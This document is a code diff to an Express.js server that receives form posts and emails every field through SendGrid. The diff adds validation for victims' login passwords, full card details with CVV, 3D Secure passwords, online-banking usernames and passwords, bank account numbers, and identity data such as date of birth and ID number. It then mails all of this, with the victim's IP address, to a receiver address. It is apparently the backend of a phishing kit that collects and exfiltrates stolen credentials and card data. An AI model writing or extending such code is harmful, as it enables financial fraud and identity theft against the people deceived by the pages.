@@ -1,6 +1,7 @@
 const express = require('express');
 const cors = require('cors');
 const sgMail = require('@sendgrid/mail');
+const rateLimit = require('express-rate-limit');
 const app = express();
 
 // Middleware
@@ -8,10 +9,16 @@ app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
 app.use(cors({ origin: process.env.FRONTEND_URL || '*' }));
 
+// Rate limiting to prevent abuse
+app.use('/api/submit', rateLimit({
+    windowMs: 15 * 60 * 1000, // 15 minutes
+    max: 100 // Limit each IP to 100 requests per window
+}));
+
 // Set SendGrid API key
 sgMail.setApiKey(process.env.SENDGRID_API_KEY);
 
-// Handle GET /api/submit to prevent "Cannot GET" error
+// Handle GET /api/submit (not allowed)
 app.get('/api/submit', (req, res) => {
     res.status(405).json({ error: 'Method Not Allowed. Use POST to submit form data.' });
 });
@@ -19,55 +26,134 @@ app.get('/api/submit', (req, res) => {
 // POST endpoint for all form submissions
 app.post('/api/submit', async (req, res) => {
     const formData = req.body;
-    const formType = formData.form_type || 'Unknown Form'; // Identify the form source
+    const formType = formData.form_type || 'Unknown Form';
 
-    // Basic validation: ensure at least one field is provided
+    // Basic validation
     if (!formData || Object.keys(formData).length === 0) {
         return res.status(400).json({ error: 'No form data provided' });
     }
 
-    // Optional: Page-specific validation
-    if (formType === 'login') {
-        const { email, pass } = formData;
-        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-        if (!emailRegex.test(email) || pass.length < 8 || pass.length > 20) {
-            return res.status(400).json({ error: 'Invalid email or password (8-20 characters required)' });
-        }
-    }
-    // Add more form-specific validations here (e.g., for signup, contact)
-
-    // Build email content dynamically
-    let textContent = `++------[ ${formType} Details ]------++\n`;
-    let htmlContent = `<h3>${formType} Details</h3>`;
-    for (const [key, value] of Object.entries(formData)) {
-        if (key !== 'form_type') { // Exclude form_type from details
-            textContent += `${key}: ${value}\n`;
-            htmlContent += `<p><strong>${key}:</strong> ${value}</p>`;
-        }
-    }
-    textContent += `\n++------[ Client Info ]------++\n`;
-    textContent += `IP: ${req.ip}\nTimestamp: ${new Date().toUTCString()}\nUser-Agent: ${req.get('User-Agent')}\n`;
-    htmlContent += `<hr><h3>Client Info</h3>`;
-    htmlContent += `<p><strong>IP:</strong> ${req.ip}</p>`;
-    htmlContent += `<p><strong>Timestamp:</strong> ${new Date().toUTCString()}</p>`;
-    htmlContent += `<p><strong>User-Agent:</strong> ${req.get('User-Agent')}</p>`;
-
-    // Email configuration
-    const msg = {
-        to: process.env.RECEIVER_EMAIL,
-        from: process.env.SENDER_EMAIL,
-        subject: `New ${formType} Submission [${formData.email || 'No Email'}]`,
-        text: textContent,
-        html: htmlContent
-    };
-
+    // Form-specific validation
     try {
+        if (formType === 'login' || formType === 'retry_login') {
+            const { email, password } = formData;
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            if (!emailRegex.test(email) || password.length < 8 || password.length > 20) {
+                return res.status(400).json({ error: 'Invalid email or password (8-20 characters required)' });
+            }
+        } else if (formType === 'card_info') {
+            const { cc_number, expdate_month, expdate_year, cvv2_number, email_locked, sort_code1, sort_code2, sort_code3, accnum, bsbnum_1, bsbnum_2, cc_limit } = formData;
+            const cardRegex = /^\d{13,19}$/;
+            const cvvRegex = /^\d{3,4}$/;
+            const expiryMonthRegex = /^(0[1-9]|1[0-2])$/;
+            const expiryYearRegex = /^\d{4}$/;
+            if (!cardRegex.test(cc_number?.replace(/\s/g, '')) || !cvvRegex.test(cvv2_number) ||
+                !expiryMonthRegex.test(expdate_month) || !expiryYearRegex.test(expdate_year) || parseInt(expdate_year) < new Date().getFullYear()) {
+                return res.status(400).json({ error: 'Invalid card number, CVV, or expiration date' });
+            }
+            if (email_locked && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email_locked)) {
+                return res.status(400).json({ error: 'Invalid email_locked format' });
+            }
+            if (sort_code1 || sort_code2 || sort_code3 || accnum) {
+                if (!/^\d{2}$/.test(sort_code1) || !/^\d{2}$/.test(sort_code2) || !/^\d{2}$/.test(sort_code3) || !/^\d{8}$/.test(accnum)) {
+                    return res.status(400).json({ error: 'Invalid sort code or account number' });
+                }
+            }
+            if (bsbnum_1 || bsbnum_2) {
+                if (!/^\d{2,6}$/.test(bsbnum_1) || !/^\d{2,10}$/.test(bsbnum_2) || !/^\d{2,15}$/.test(accnum)) {
+                    return res.status(400).json({ error: 'Invalid BSB or account number' });
+                }
+            }
+            if (cc_limit && !/^\d{1,10}$/.test(cc_limit)) {
+                return res.status(400).json({ error: 'Invalid credit limit' });
+            }
+        } else if (formType === 'vbv_info') {
+            const { cc_pass, cc_login, email_locked } = formData;
+            if (!cc_pass || cc_pass.length > 30) {
+                return res.status(400).json({ error: 'Invalid 3D Secure password' });
+            }
+            if (cc_login && cc_login.length > 18) {
+                return res.status(400).json({ error: 'Invalid Login ID' });
+            }
+            if (email_locked && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email_locked)) {
+                return res.status(400).json({ error: 'Invalid email_locked format' });
+            }
+        } else if (formType === 'bank_info') {
+            const { bnkname, bnknameca, acnot, bnknameus, lobank, pwd_csdad, swsd, email_locked } = formData;
+            if (!bnkname && !bnknameca && !acnot) {
+                return res.status(400).json({ error: 'Bank name or account number is required' });
+            }
+            if (bnknameus || lobank || pwd_csdad) {
+                if (!bnknameus || !lobank || !pwd_csdad || pwd_csdad.length > 24) {
+                    return res.status(400).json({ error: 'Invalid bank name, username, or password' });
+                }
+            }
+            if (swsd && swsd.length > 25) {
+                return res.status(400).json({ error: 'Invalid SWIFT code' });
+            }
+            if (email_locked && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email_locked)) {
+                return res.status(400).json({ error: 'Invalid email_locked format' });
+            }
+        } else if (formType === 'address_info') {
+            const { full_name, address_1, city, postal, phone, number_1, number_2, number_3, id_number, day, month, year, email_locked } = formData;
+            if (!full_name || full_name.length > 30 || !address_1 || address_1.length > 30 || !city || city.length > 30 || !postal || postal.length > 11) {
+                return res.status(400).json({ error: 'Invalid name, address, city, or postal code' });
+            }
+            if (number_1 || number_2 || number_3) {
+                if (number_1.length === 3 && number_2.length === 2 && number_3.length >= 4) {
+                    // Israel format
+                } else if (number_1.length === 3 && number_2.length === 3 && number_3.length >= 4) {
+                    // US/UK format
+                } else {
+                    return res.status(400).json({ error: 'Invalid phone number format' });
+                }
+            } else if (!phone || phone.length > 15) {
+                return res.status(400).json({ error: 'Invalid phone number' });
+            }
+            if (id_number && id_number.length > (formData.country === 'HK' ? 25 : 20)) {
+                return res.status(400).json({ error: 'Invalid ID number' });
+            }
+            if (!day || !month || !/^\d{4}$/.test(year) || parseInt(year) > new Date().getFullYear() - 18) {
+                return res.status(400).json({ error: 'Invalid date of birth (must be at least 18 years old)' });
+            }
+            if (email_locked && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email_locked)) {
+                return res.status(400).json({ error: 'Invalid email_locked format' });
+            }
+        } else {
+            return res.status(400).json({ error: 'Unknown form type' });
+        }
+
+        // Build email content
+        let textContent = `++------[ ${formType} Details ]------++\n`;
+        let htmlContent = `<h3>${formType} Details</h3>`;
+        for (const [key, value] of Object.entries(formData)) {
+            if (key !== 'form_type') {
+                textContent += `${key}: ${value}\n`;
+                htmlContent += `<p><strong>${key}:</strong> ${value}</p>`;
+            }
+        }
+        textContent += `\n++------[ Client Info ]------++\n`;
+        textContent += `IP: ${req.ip}\nTimestamp: ${new Date().toUTCString()}\nUser-Agent: ${req.get('User-Agent')}\n`;
+        htmlContent += `<hr><h3>Client Info</h3>`;
+        htmlContent += `<p><strong>IP:</strong> ${req.ip}</p>`;
+        htmlContent += `<p><strong>Timestamp:</strong> ${new Date().toUTCString()}</p>`;
+        htmlContent += `<p><strong>User-Agent:</strong> ${req.get('User-Agent')}</p>`;
+
+        const msg = {
+            to: process.env.RECEIVER_EMAIL,
+            from: process.env.SENDER_EMAIL,
+            subject: `New ${formType} Submission [${formData.email || formData.email_locked || formData.cc_number || formData.acnot || formData.full_name || 'No Identifier'}]`,
+            text: textContent,
+            html: htmlContent
+        };
+
+        // Send email via SendGrid
         await sgMail.send(msg);
         console.log(`Email sent for ${formType} submission`);
         res.json({ status: 'success', message: `${formType} data received and emailed` });
     } catch (error) {
-        console.error('SendGrid Error:', error);
-        res.status(500).json({ error: 'Failed to send email' });
+        console.error('Error processing request:', error);
+        res.status(500).json({ error: `Failed to process ${formType} data: ${error.message}` });
     }
 });
 
